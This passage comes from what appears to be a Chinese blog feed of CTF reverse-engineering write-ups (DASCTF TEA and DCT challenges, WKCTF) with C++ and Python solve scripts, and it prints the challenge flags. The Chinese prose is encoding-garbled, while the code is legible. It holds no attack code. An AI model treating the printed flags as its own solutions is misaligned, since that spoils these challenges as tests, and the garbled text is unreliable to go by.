class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x09</span>, <span class="number">0x63</span>, <span class="number">0x34</span>, <span class="number">0x32</span>, <span class="number">0x13</span>, <span class="number">0x2A</span>, <span class="number">0x2F</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x3C</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x2E</span>, <span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0x3A</span>, <span class="number">0x27</span>, <span class="number">0x2F</span>, <span class="number">0x24</span>, <span class="number">0x3A</span>, <span class="number">0x30</span>, <span class="number">0x75</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>]</span><br><span class="line">c = [<span class="number">0x44</span>, <span class="number">0x41</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>]</span><br><span class="line"><span class="keyword">pxor</span>(a,c)</span><br><span class="line"># DASCTF&#123;H0wfUnnytheDosSnakeis!!!&#125;</span><br></pre></td></tr></table></figure><h2 id="Strangeprograme">Strangeprograme</h2><p>å¸¸è§„TEAï¼Œä¸å¤šè¯´</p><p>åè°ƒï¼Œé™„åŠ è°ƒè¯•è¿›å…¥ä¸»è¦åˆ¤æ–­é€»è¾‘</p><p>åŠ å¯†æ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«æ˜¯åªåŠ å¯†ç¬¬ä¸€ç»„æ•°æ®ï¼Œç„¶åå¼‚æˆ–åé¢çš„æ•°æ®</p><p>ç›´æ¥å†™è„šæœ¬è§£</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">enc</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* a1, <span class="type">unsigned</span> <span class="type">int</span>* a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-2Ch]</span></span><br><span class="line"><span class="type">int</span> v3; <span class="comment">// [esp+E8h] [ebp-20h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+F4h] [ebp-14h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+100h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//sub_4114D8(&amp;unk_4250F3);</span></span><br><span class="line">v5 = *a1;</span><br><span class="line">v4 = a1[<span class="number">1</span>];</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v5 += (a2[<span class="number">1</span>] + (v4 &gt;&gt; <span class="number">5</span>)) ^ (v3 + v4) ^ (*a2 + <span class="number">16</span> * v4);</span><br><span class="line">v4 += (a2[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (v3 + v5) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v5);</span><br><span class="line">v3 -= <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;</span><br><span class="line">*a1 = v5;</span><br><span class="line">a1[<span class="number">1</span>] = v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* a1, <span class="type">unsigned</span> <span class="type">int</span>* a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-2Ch]</span></span><br><span class="line"><span class="type">int</span> sum; <span class="comment">// [esp+E8h] [ebp-20h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+F4h] [ebp-14h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+100h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//sub_4114D8(&amp;unk_4250F3);</span></span><br><span class="line">v5 = *a1;</span><br><span class="line">v4 = a1[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum += <span class="number">0x61C88647</span>;</span><br><span class="line">v4 -= (a2[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (sum + v5) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v5);</span><br><span class="line">v5 -= (a2[<span class="number">1</span>] + (v4 &gt;&gt; <span class="number">5</span>)) ^ (sum + v4) ^ (*a2 + <span class="number">16</span> * v4);</span><br><span class="line">&#125;</span><br><span class="line">*a1 = v5;</span><br><span class="line">a1[<span class="number">1</span>] = v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> last[<span class="number">10</span>] = &#123;</span><br><span class="line"><span class="number">0xBC2B4DF9</span>, <span class="number">0x6213DD13</span>, <span class="number">0x89FFFCC9</span>, <span class="number">0x0FC94F7D</span>, <span class="number">0x526D1D63</span>, <span class="number">0xE341FD50</span>, <span class="number">0x97287633</span>, <span class="number">0x6BF93638</span>,</span><br><span class="line"><span class="number">0x83143990</span>, <span class="number">0x1F2CE22C</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x12345678</span>, <span class="number">0x09101112</span>, <span class="number">0x13141516</span>, <span class="number">0x15161718</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">8</span>; i &gt; <span class="number">0</span>; i -= <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">last[i] ^= last[<span class="number">0</span>];</span><br><span class="line">last[i + <span class="number">1</span>] ^= last[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">dec</span>(last, key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">dec</span>(last, key);</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)last;</span><br><span class="line">&#125;</span><br><span class="line"># DASCTF&#123;I4TH0ok_I5S0ooFunny_Isnotit?????&#125;</span><br></pre></td></tr></table></figure><h2 id="BabyAndroid">BabyAndroid</h2><p>è¿™ä¸ªé¢˜å¦‚æœæ²¡æœ‰å¥—å¨ƒï¼Œæˆ‘æ„¿å¤¸å®ƒï¼Œä½†æ˜¯å‡ºé¢˜äººçŸ¥ä¸çŸ¥é“æˆ‘ä»¥ä¸ºæˆ‘è¦è§£å®Œäº†ç»“æœæ‰æ˜¯åˆšåˆšå¼€å§‹æœ‰å¤šä¹ˆå´©æºƒ</p><p>é¦–å…ˆé¢˜ç›®ç»™äº†æŠ“åŒ…ä¿¡æ¯</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">charset</span><span class="punctuation">: </span>utf-8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Dalvik/2.1.0 (Linux; U; Android 11; M2004J7AC Build/RP1A.200720.011)</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>yuanshen.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>413</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">data</span>=TwMkYUkg4bYsY0hL99ggYWnVjWyXQrWAdNmToB0eBXbS6wBzL6ktorjNWI9VOroTU4HgIUYyzGLpcHzd1zNGT+bFZZI7IoxJwpcgXfdwW1LSmiNSP+PuSUsqAzNclF1nJ07b4tYyLWg0zTypbzWsLhOIM+<span class="number">6</span>uci3RFZLREUCALafi01M8mS+KMNxX1Pyn8mSP+KKKjQ5S5fasHRSn+L9qBFws0mWavpfI0QEiMgarxv0iGhYU8cfgonWyL70RvoXET5VUDP1vfYWIBLzzzaAqLC0OiMtUK3TTATSU7yijdgXm18OKMcGIke/NZIM6Sr5fL3t6psDOOkw2C/<span class="number">5</span>uYrJVPn+D6U9KTL64bgREppDqMOvhvbhtuf/S3ASW/+rhtPMtoaD8FxDg0wWSLZA53fQfNA==</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾dataå°±æ˜¯flagï¼Œç„¶åè¦é€†ç¨‹åº</p><p>jadxï¼ˆåŸè°…æˆ‘å®‰å“åªä¼šjadxQAQï¼‰æœç´¢yuanshen.comæ‰¾åˆ°å‘é€ä½ç½®</p><p><img src="https://s2.loli.net/2024/07/21/mR4YMlZDWVLO7py.png" alt="image-20240721175844067"></p><p>ç„¶åå®ƒç”¨åå°„è°ƒç”¨äº†encryptæ–¹æ³•ï¼Œæ²¡æœ‰æœç´¢åˆ°ï¼ŒåŒæ—¶ä¹Ÿæ²¡çœ‹åˆ°site.qifen.note.ui.Encryptoï¼Œç„¶åè¯¦ç»†çœ‹è¿™æ®µä»£ç ï¼Œå‘ç°å®ƒåŠ è½½äº†sex.jpgç„¶åè§£å¯†ä½œä¸ºdexï¼Œé‚£ä¹ˆæŸ¥çœ‹è§£å¯†æ–¹æ³•ï¼Œè§£å¯†dexï¼Œå‘ç°æ˜¯rc4ï¼Œç›´æ¥å¤åˆ¶ä¸ºæ–‡æœ¬è§£å¯†</p><p>ç„¶åçœ‹åŠ å¯†æ–¹å¼</p><p><img src="https://s2.loli.net/2024/07/22/giLMsU5YJQGAEWk.png" alt="image-20240721180421330"></p><p>å¾—åˆ°å¯†é’¥ï¼š0D0D0D0D0D0D0D0D0D0D0D0D0D0D0D0D</p><p>è§£å¯†æ•°æ®å¾—åˆ°</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">458</span>.<span class="number">853181</span>,-<span class="number">18</span>.<span class="number">325492</span>,-<span class="number">18</span>.<span class="number">251911</span>,-<span class="number">2</span>.<span class="number">097520</span>,-<span class="number">21</span>.<span class="number">198660</span>,-<span class="number">22</span>.<span class="number">304648</span>,<span class="number">21</span>.<span class="number">103162</span>,-<span class="number">5</span>.<span class="number">786284</span>,-<span class="number">15</span>.<span class="number">248906</span>,<span class="number">15</span>.<span class="number">329286</span>,<span class="number">16</span>.<span class="number">919499</span>,-<span class="number">19</span>.<span class="number">669045</span>,<span class="number">30</span>.<span class="number">928253</span>,-<span class="number">37</span>.<span class="number">588034</span>,-<span class="number">16</span>.<span class="number">593954</span>,-<span class="number">5</span>.<span class="number">505211</span>,<span class="number">3</span>.<span class="number">014744</span>,<span class="number">6</span>.<span class="number">553616</span>,<span class="number">31</span>.<span class="number">131491</span>,<span class="number">16</span>.<span class="number">472500</span>,<span class="number">6</span>.<span class="number">802400</span>,-<span class="number">78</span>.<span class="number">278577</span>,<span class="number">15</span>.<span class="number">280099</span>,<span class="number">3</span>.<span class="number">893073</span>,<span class="number">56</span>.<span class="number">493581</span>,-<span class="number">34</span>.<span class="number">576344</span>,<span class="number">30</span>.<span class="number">146729</span>,<span class="number">4</span>.<span class="number">445671</span>,<span class="number">6</span>.<span class="number">732204</span></span><br></pre></td></tr></table></figure><p>ï¼Ÿï¼Ÿï¼Ÿä»€ä¹ˆç©æ„</p><p>ç„¶åå†ä¸€çœ‹æ•°æ®ä¼ å…¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">cipher</span> <span class="operator">=</span> (String) checkMethod.invoke(checkerClass.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]), NoteActivity.<span class="built_in">this</span>.sendInit(contentText));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªsendInit</p><p>ä¸€çœ‹æ˜¯ä¸ªnativeï¼Œapktoolè§£åŒ…ï¼Œidaå¼€</p><p><img src="https://s2.loli.net/2024/07/22/VmuI7E9RPlWzAGN.png" alt="image-20240721181218663"></p><p>å¯ä»¥æ‰¾åˆ°encryptå‡½æ•°</p><p>è¿™é‡Œå¤åˆ¶ä¸‹æ¥ç½‘ä¸Šæœç´¢å¯ä»¥æŸ¥åˆ°ï¼Œè¿™ä¸ªç®—æ³•æ˜¯DCT2ï¼Œä¸€ç»´çš„ï¼Œæœç´¢å¯ä»¥çœ‹åˆ°ï¼š</p><p><a href="https://zh.wikipedia.org/wiki/%E7%A6%BB%E6%95%A3%E4%BD%99%E5%BC%A6%E5%8F%98%E6%8D%A2">ç¦»æ•£ä½™å¼¦å˜æ¢</a></p><p>ä½†æ˜¯DCT3å¹¶ä¸å¯ä»¥ç›´æ¥é€†å‘DCT2ï¼ŒæŸ¥äº†å¾ˆå¤šèµ„æ–™ä¹Ÿæ²¡æŸ¥åˆ°</p><p>ç„¶åå°±çœ‹ç€ä½¬çš„wpå¤ç°äº†</p><p>é€†å‘æ—¶ï¼ŒæŠŠDCT3çš„$x_0/2$å»æ‰ï¼Œç„¶ååé¢å¤„ç†ç›¸åŒï¼Œ</p><p>åŒæ—¶å¯¹æ¯ä¸ªå€¼ä¹˜ä»¥$\sqrt{\frac{2}{N}}$å’Œ$\sqrt{\frac{1}{N}}$ä¹Ÿæ˜¯åœ¨DCT2åŒæ ·çš„ä½ç½®å¤„ç†ï¼Œä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dct3</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">double</span>&gt;&amp; Y, std::vector&lt;<span class="type">double</span>&gt;&amp; X)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> N = Y.<span class="built_in">size</span>();</span><br><span class="line">X.<span class="built_in">resize</span>(N);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; N; ++n) &#123;</span><br><span class="line"><span class="type">double</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; N; ++k) &#123;</span><br><span class="line"><span class="keyword">if</span> (k == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">sum += Y[k] * std::<span class="built_in">cos</span>(<span class="number">3.14159265</span> * k * (n + <span class="number">0.5</span>) / N) * std::<span class="built_in">sqrt</span>(<span class="number">1.0</span> / N);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sum += Y[k] * std::<span class="built_in">cos</span>(<span class="number">3.14159265</span> * k * (n + <span class="number">0.5</span>) / N) * std::<span class="built_in">sqrt</span>(<span class="number">2.0</span> / N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">X[n] = sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">std::vector&lt;<span class="type">double</span>&gt; res = &#123; <span class="number">458.853181</span>,<span class="number">-18.325492</span>,<span class="number">-18.251911</span>,<span class="number">-2.097520</span>,<span class="number">-21.198660</span>,<span class="number">-22.304648</span>,<span class="number">21.103162</span>,<span class="number">-5.786284</span>,</span><br><span class="line"><span class="number">-15.248906</span>,<span class="number">15.329286</span>,<span class="number">16.919499</span>,<span class="number">-19.669045</span>,<span class="number">30.928253</span>,<span class="number">-37.588034</span>,<span class="number">-16.593954</span>,<span class="number">-5.505211</span>,</span><br><span class="line"><span class="number">3.014744</span>,<span class="number">6.553616</span>,<span class="number">31.131491</span>,<span class="number">16.472500</span>,<span class="number">6.802400</span>,<span class="number">-78.278577</span>,<span class="number">15.280099</span>,<span class="number">3.893073</span>,</span><br><span class="line"><span class="number">56.493581</span>,<span class="number">-34.576344</span>,<span class="number">30.146729</span>,<span class="number">4.445671</span>,<span class="number">6.732204</span> &#125;;</span><br><span class="line">std::vector&lt;<span class="type">double</span>&gt; X;</span><br><span class="line"><span class="built_in">dct3</span>(res, X);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">double</span> x : X) &#123;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> chr = (<span class="type">char</span>)std::<span class="built_in">round</span>(X[i]);</span><br><span class="line">std::cout &lt;&lt; chr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// DASCTF&#123;Y0u_Ar3Re4lly_H@ck3r!&#125;</span></span><br></pre></td></tr></table></figure><hr><p>è¡¥å……DCTå˜æ¢å…¬å¼ï¼ˆä¸€ç»´ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2024/07/22/VjwTGsU8gbd9Mqr.png" alt="image-20240722132702606"></p><p>é€†å˜æ¢</p><p><img src="https://s2.loli.net/2024/07/22/iSNuvny7QTjHwcE.png" alt="image-20240722132724585"></p><p>å°±æŒ‰ä¸Šé¢å†™çš„é‚£æ ·å†™å°±å¥½äº†</p>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> æ±‡ç¼– </tag>
            
            <tag> è°ƒè¯• </tag>
            
            <tag> å¥—å¨ƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golangå­¦ä¹ </title>
      <link href="/posts/484c947.html"/>
      <url>/posts/484c947.html</url>
      
        <content type="html"><![CDATA[<p>æœ‰ç‚¹æƒ³å­¦å¼€å‘ï¼Œè¿™é‡Œå…ˆå¼€ä¸€ç¯‡ï¼Œä¹‹åè¡¥å……</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;Hi I love %s!&quot;</span>, r.URL.Path[<span class="number">1</span>:])</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/&quot;</span>, handler)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªåŸºæœ¬çš„ç½‘é¡µ</p><p>åŸºæœ¬è¯­æ³•ï¼š</p><p><a href="https://www.runoob.com/go/go-tutorial.html">Go è¯­è¨€æ•™ç¨‹ | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å¼€å‘ </category>
          
          <category> è¯­è¨€å­¦ä¹  </category>
          
          <category> golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¯­æ³• </tag>
            
            <tag> è¯­è¨€ </tag>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WKCTF-REéƒ¨åˆ†wp</title>
      <link href="/posts/4f799b15.html"/>
      <url>/posts/4f799b15.html</url>
      
        <content type="html"><![CDATA[<h2 id="very-easy-è¯¥é¢˜æœªåšå‡º">very_easy[è¯¥é¢˜æœªåšå‡º]</h2><p>æ ¹æ®<a href="https://blog.csdn.net/Pisces50002/article/details/139580346">çŸ©é˜µæ¯2024 Re wp å‰ä¸¤é¢˜-CSDNåšå®¢</a>è¿™ç¯‡åšå®¢ï¼Œé‡åˆ°ç±»ä¼¼çš„é¢˜éœ€è¦ä¸‹è½½quickJSååœ¨linuxç³»ç»Ÿä¸Šmakeç¼–è¯‘ï¼Œå¹¶ä»¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;quickjs-libc.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> qjsc_size = <span class="number">3881</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> qjsc[<span class="number">3884</span>] = &#123;</span><br><span class="line">   the_data</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  JSRuntime *rt;</span><br><span class="line">  JSContext *ctx;</span><br><span class="line">  rt = JS_NewRuntime();</span><br><span class="line">  ctx = JS_NewContextRaw(rt);</span><br><span class="line">  JS_SetModuleLoaderFunc(rt, <span class="literal">NULL</span>, js_module_loader, <span class="literal">NULL</span>);</span><br><span class="line">  JS_AddIntrinsicBaseObjects(ctx);</span><br><span class="line">  JS_AddIntrinsicDate(ctx);</span><br><span class="line">  JS_AddIntrinsicEval(ctx);</span><br><span class="line">  JS_AddIntrinsicStringNormalize(ctx);</span><br><span class="line">  JS_AddIntrinsicRegExp(ctx);</span><br><span class="line">  JS_AddIntrinsicJSON(ctx);</span><br><span class="line">  JS_AddIntrinsicProxy(ctx);</span><br><span class="line">  JS_AddIntrinsicMapSet(ctx);</span><br><span class="line">  JS_AddIntrinsicTypedArrays(ctx);</span><br><span class="line">  JS_AddIntrinsicPromise(ctx);</span><br><span class="line">  JS_AddIntrinsicBigInt(ctx);</span><br><span class="line">  js_std_add_helpers(ctx, argc, argv);</span><br><span class="line">  js_std_eval_binary(ctx, qjsc, qjsc_size, <span class="number">0</span>);</span><br><span class="line">  js_std_loop(ctx);</span><br><span class="line">  JS_FreeContext(ctx);</span><br><span class="line">  JS_FreeRuntime(rt);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ç¼–è¯‘åæŠ¥é”™version 2 expected 67. ç„¶åå°±æ”¾å¼ƒäº†</p><h2 id="so-easy">so_easy</h2><p>ä¸€ä¸ªsoçš„ç®—æ³•é€†å‘</p><p>é‡åˆ°soå¯ä»¥ç”¨å¤šç§æ¶æ„çš„éƒ½çœ‹ä¸€ä¸‹ï¼Œé˜²æ­¢æŸä¸€ä¸ªåç¼–è¯‘å‡ºæ¥æ¯”è¾ƒå¥‡æ€ªã€‚</p><p>é€»è¾‘å¤§è‡´æ˜¯è¿™æ ·ï¼š</p><p><img src="https://s2.loli.net/2024/07/16/8F51fyzBTO4QNlK.png" alt="image-20240716091801464"></p><p>è¿™ç§æ¯ä¸ªéƒ½è¦å¾ªç¯255æ¬¡çš„ï¼Œçˆ†ç ´æ€•æ˜¯ä¸ç°å®ï¼Œæ‰€ä»¥ä¸€å®šè¦æ‰¾åˆ°ä¸¤ç§æ“ä½œå¯¹ç»“æœçš„ä¸åŒå½±å“ã€‚</p><p>å¯ä»¥å‘ç°ï¼š</p><p>inputæœ€é«˜ä½ä¸º0æ—¶ï¼ˆinputä¸ºæ­£æ•°ï¼‰ï¼Œä»…å·¦ç§»ä¸€ä½ï¼Œæœ€å0ä½ä¸º0<br>inputæœ€é«˜ä½ä¸º1æ—¶ï¼ˆinputä¸ºè´Ÿæ•°ï¼‰ï¼Œå·¦ç§»å†å¼‚æˆ–ï¼Œæœ€å0ä½ä¸º1</p><p>æ ¹æ®è¿™ä¸€ç‚¹æ¥åˆ¤æ–­å¤§å°ç„¶åå†™ç®—æ³•é€†å‘</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 